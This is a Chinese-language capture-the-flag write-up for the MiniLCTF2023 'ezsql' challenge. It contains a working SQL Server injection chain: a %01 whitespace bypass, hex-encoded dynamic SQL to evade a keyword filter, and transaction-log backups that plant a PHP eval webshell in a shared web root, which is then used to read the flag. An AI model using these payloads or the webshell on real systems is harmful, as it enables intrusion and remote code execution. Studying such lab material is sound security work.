# MiniLCTF2023 - ezsql

## 题目简述

PHP 把 POST 参数 `id` 直接拼入 Microsoft SQL Server 查询，并允许用分号执行后续语句。过滤器先删除 `\s`，再删除若干字符以及小写 `insert`、`alter`、`create`。数据库连接使用 `sa`，数据库容器与 Apache 容器还共享 `/var/www/html` 卷，因此 SQL Server 的文件写能力可以直接落到 Web 根目录。

利用链为：控制字符绕过空白过滤，十六进制动态 SQL 绕过关键字过滤，再利用 SQL Server 日志备份把 PHP 代码写进共享目录。

## 解题过程

原查询为：

```sql
SELECT id FROM dbo.users WHERE id = <input>
```

后端会按分号拆分并逐条执行，所以输入以 `1;` 开头即可保留第一条合法查询。URL 解码发生在 PHP 过滤之前，`%01` 会变成字节 `0x01`：它不属于正则 `\s`，却可被 T-SQL 当作 token 分隔符。危险语句本身转为十六进制，再由 `exec(@s)` 执行，黑名单看不到明文关键字。

```python
def wrap(sql):
    encoded = sql.encode().hex()
    return (
        "1;declare%01@s%01varchar(2000)"
        "%01set%01@s=0x" + encoded +
        "%01exec(@s)"
    )


statements = [
    "ALTER DATABASE ctf SET RECOVERY FULL",
    "CREATE TABLE cmd (a image)",
    "BACKUP LOG ctf TO DISK = '/var/www/html/1.bak' WITH INIT",
    "INSERT INTO cmd (a) VALUES "
    "(0x3c3f706870206576616c28245f504f53545b315d293b3f3e)",
    "BACKUP LOG ctf TO DISK = '/var/www/html/shell.php'",
]

for statement in statements:
    print(wrap(statement))
```

插入的十六进制内容解码为：

```php
<?php eval($_POST[1]);?>
```

把该行写入 `cmd` 后再次备份事务日志，`shell.php` 虽带有备份格式的其他字节，但其中的 PHP 标签仍会被解释器执行。`docker-compose.yml` 证明数据库和 Web 服务共享同一个 `webService` 卷；首页还会通过 sudo 把当前目录文件权限调整为 644，因此新文件可被 Apache 读取。

访问 `/shell.php`，以 POST 参数 `1` 提交 `system('cat /flag');` 即可读 flag。仓库只保存了部署占位值，未保留比赛远程的实际回包。

## 方法总结

SQL 注入的影响由数据库权限和部署拓扑共同决定。本题若只枚举表，会错过题面暗示的主机文件 flag；`sa`、日志备份和跨容器共享卷把 SQL 写文件直接升级为 Web RCE。过滤绕过也分两层：`%01` 解决 token 分隔，十六进制动态执行隐藏敏感 SQL 文本。
